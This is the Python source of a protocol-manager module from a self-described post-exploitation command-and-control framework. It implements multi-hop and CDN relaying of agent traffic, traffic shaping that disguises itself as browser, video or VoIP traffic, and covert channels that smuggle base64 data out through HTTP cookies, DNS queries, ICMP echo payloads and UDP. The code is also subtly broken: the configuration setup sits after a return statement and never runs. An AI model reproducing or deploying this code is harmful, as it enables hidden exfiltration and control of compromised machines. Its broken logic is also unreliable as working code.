"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import os
import random
import string
import base64
import json
import time
import dns.resolver
import requests
import socket
import struct
import threading
from core.config import NeoC2Config
from communication.protocols import HTTPProtocol, DNSProtocol, ICMPProtocol, UDPProtocol

class ProtocolManager:
    def __init__(self, config, db=None, agent_manager=None):
        self.config = config
        self.db = db
        self.agent_manager = agent_manager
        self.protocols = {
            'http': HTTPProtocol(config),
            'dns': DNSProtocol(config),
            'icmp': ICMPProtocol(config),
            'udp': UDPProtocol(config)
        }
        
        self.multiplexer = None
        self.negotiator = None

        self.fallback_protocol_chain = [
            'https', 'http'  # Only basic protocols available after deprecation
        ]
    
    def get_fallback_protocol(self, failed_protocol=None):
        return 'http'  # Default fallback
    
    def handle_with_fallback(self, data, initial_protocol=None, target=None):
        protocol = initial_protocol or 'http'  # Use HTTP as default
        if protocol not in self.protocols:
            raise ValueError(f"Unsupported protocol: {protocol}")
        return self.protocols[protocol].send(data, target)
        
        self.enabled_protocols = config.get('communication.custom_protocols', ['http', 'dns'])

        self.multi_hop = config.get('communication.multi_hop', False)
        self.hop_count = config.get('communication.hop_count', 3)
        self.hop_proxies = config.get('communication.hop_proxies', [])

        self.cdn_integration = config.get('communication.cdn_integration', False)
        self.cdn_domains = config.get('communication.cdn_domains', [])

        self.traffic_shaping = False
        self.traffic_profile = 'default'

        self.dns_tunneling = config.get('communication.dns_tunneling', True)
        self.dns_server = config.get('communication.dns_server', '8.8.8.8')

        self.covert_channels = config.get('communication.covert_channels', True)
        self.covert_channel_type = config.get('communication.covert_channel_type', 'http_cookie')
    
    def get_enabled_protocols(self):
        return [protocol for protocol in self.enabled_protocols if protocol in self.protocols]
    
    def send_data(self, data, protocol=None, target=None):
        if not protocol:
            protocol = random.choice(self.enabled_protocols)
        
        if protocol not in self.protocols:
            raise ValueError(f"Unsupported protocol: {protocol}")
        
        if self.multi_hop and self.hop_proxies:
            return self._send_multi_hop(data, protocol, target)

        if self.cdn_integration and self.cdn_domains:
            return self._send_via_cdn(data, protocol, target)

        return self.protocols[protocol].send(data, target)
    
    def receive_data(self, protocol=None, timeout=30):
        if not protocol:
            protocol = random.choice(self.enabled_protocols)
        
        if protocol not in self.protocols:
            raise ValueError(f"Unsupported protocol: {protocol}")
        
        return self.protocols[protocol].receive(timeout)
    
    def _send_multi_hop(self, data, protocol, target=None):
        if not self.hop_proxies:
            return self.protocols[protocol].send(data, target)
        
        proxies = random.sample(self.hop_proxies, min(self.hop_count, len(self.hop_proxies)))

        for i, proxy in enumerate(proxies):
            if i == len(proxies) - 1:
                return self.protocols[protocol].send(data, target, proxy)
            else:
                next_proxy = proxies[i + 1]
                hop_data = {
                    'target': next_proxy,
                    'data': data if i == 0 else None,
                    'hop': i + 1,
                    'total_hops': len(proxies)
                }
                self.protocols[protocol].send(json.dumps(hop_data), proxy, proxy)
        
        return None
    
    def _send_via_cdn(self, data, protocol, target=None):
        if not self.cdn_domains:
            return self.protocols[protocol].send(data, target)
        
        cdn_domain = random.choice(self.cdn_domains)

        if target:
            if protocol == 'http':
                from urllib.parse import urlparse
                parsed = urlparse(target)
                cdn_target = parsed._replace(netloc=cdn_domain).geturl()
                return self.protocols[protocol].send(data, cdn_target)
            else:
                return self.protocols[protocol].send(data, cdn_domain)
        else:
            return self.protocols[protocol].send(data, cdn_domain)
    
    def shape_traffic(self, data):
        """Shape traffic to mimic legitimate traffic - DEPRECATED"""
        return data
    
    def _shape_default(self, data):
        """Default traffic shaping"""
        padding_length = random.randint(10, 100)
        padding = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(padding_length))

        chunk_size = random.randint(100, 500)
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

        shaped_data = []
        for i, chunk in enumerate(chunks):
            shaped_data.append(chunk)
            if i < len(chunks) - 1:
                delay = random.uniform(0.1, 0.5)
                time.sleep(delay)

        return ''.join(shaped_data) + padding
    
    def _shape_browser(self, data):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        request = f"GET / HTTP/1.1\r\n"
        for header, value in headers.items():
            request += f"{header}: {value}\r\n"
        request += "\r\n"

        request += data

        return request
    
    def _shape_video(self, data):
        """Video-like traffic shaping"""
        chunk_size = 1400  # Typical MTU size
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

        shaped_data = []
        for chunk in chunks:
            shaped_data.append(chunk)
            time.sleep(0.04)  # 25 FPS

        return ''.join(shaped_data)
    
    def _shape_voip(self, data):
        chunk_size = 160  # Typical VoIP packet size
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

        shaped_data = []
        for chunk in chunks:
            shaped_data.append(chunk)
            time.sleep(0.02)  # 50 packets per second

        return ''.join(shaped_data)
    
    def tunnel_dns(self, data, domain):
        if not self.dns_tunneling:
            return None
        
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_label_length = 63
        chunks = [encoded_data[i:i+max_label_length] for i in range(0, len(encoded_data), max_label_length)]

        for i, chunk in enumerate(chunks):
            subdomain = f"{chunk}.{i}.{domain}"
            try:
                answers = dns.resolver.resolve(subdomain, 'A')
            except dns.resolver.NXDOMAIN:
                pass
            except Exception as e:
                print(f"DNS tunneling error: {str(e)}")

        return True
    
    def create_covert_channel(self, data, channel_type=None):
        if not self.covert_channels:
            return None
        
        if not channel_type:
            channel_type = self.covert_channel_type
        
        if channel_type == 'http_cookie':
            return self._http_cookie_channel(data)
        elif channel_type == 'dns_txt':
            return self._dns_txt_channel(data)
        elif channel_type == 'icmp_payload':
            return self._icmp_payload_channel(data)
        elif channel_type == 'udp_payload':
            return self._udp_payload_channel(data)
        else:
            return None
    
    def _http_cookie_channel(self, data):
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_cookie_length = 4096
        cookies = []
        for i in range(0, len(encoded_data), max_cookie_length):
            cookie_name = f"covert_data_{i//max_cookie_length}"
            cookie_value = encoded_data[i:i+max_cookie_length]
            cookies.append(f"{cookie_name}={cookie_value}")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Cookie': '; '.join(cookies)
        }

        target = random.choice(self.cdn_domains) if self.cdn_domains else 'example.com'
        try:
            response = requests.get(f"https://{target}", headers=headers)
            return response.status_code == 200
        except Exception as e:
            print(f"HTTP cookie channel error: {str(e)}")
            return False
    
    def _dns_txt_channel(self, data):
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_txt_length = 255
        txt_records = []
        for i in range(0, len(encoded_data), max_txt_length):
            subdomain = f"covert{i//max_txt_length}"
            txt_value = encoded_data[i:i+max_txt_length]
            txt_records.append((subdomain, txt_value))

        domain = random.choice(self.cdn_domains) if self.cdn_domains else 'example.com'
        for subdomain, txt_value in txt_records:
            try:
                record_name = f"{subdomain}.{domain}"
                answers = dns.resolver.resolve(record_name, 'TXT')
            except dns.resolver.NXDOMAIN:
                pass
            except Exception as e:
                print(f"DNS TXT channel error: {str(e)}")

        return True
    
    def _icmp_payload_channel(self, data):
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_icmp_payload = 1472  # Maximum ICMP payload size
        icmp_packets = []
        for i in range(0, len(encoded_data), max_icmp_payload):
            payload = encoded_data[i:i+max_icmp_payload]
            icmp_packets.append(payload)

        target = random.choice(self.cdn_domains) if self.cdn_domains else 'example.com'
        try:
            target_ip = socket.gethostbyname(target)

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(5)

            for i, payload in enumerate(icmp_packets):
                icmp_type = 8  # Echo Request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = os.getpid() & 0xFFFF
                icmp_seq = i + 1

                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

                icmp_checksum = self._calculate_checksum(icmp_header + payload.encode('utf-8'))

                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

                sock.sendto(icmp_header + payload.encode('utf-8'), (target_ip, 0))

            sock.close()
            return True
        except Exception as e:
            print(f"ICMP payload channel error: {str(e)}")
            return False
    
    def _udp_payload_channel(self, data):
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_udp_payload = 1472  # Maximum UDP payload size
        udp_packets = []
        for i in range(0, len(encoded_data), max_udp_payload):
            payload = encoded_data[i:i+max_udp_payload]
            udp_packets.append(payload)

        target = random.choice(self.cdn_domains) if self.cdn_domains else 'example.com'
        port = random.randint(1024, 65535)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            for i, payload in enumerate(udp_packets):
                sock.sendto(payload.encode('utf-8'), (target, port))

            sock.close()
            return True
        except Exception as e:
            print(f"UDP payload channel error: {str(e)}")
            return False
    
    def _calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
            checksum = (checksum & 0xffff) + (checksum >> 16)
        
        return ~checksum & 0xffff
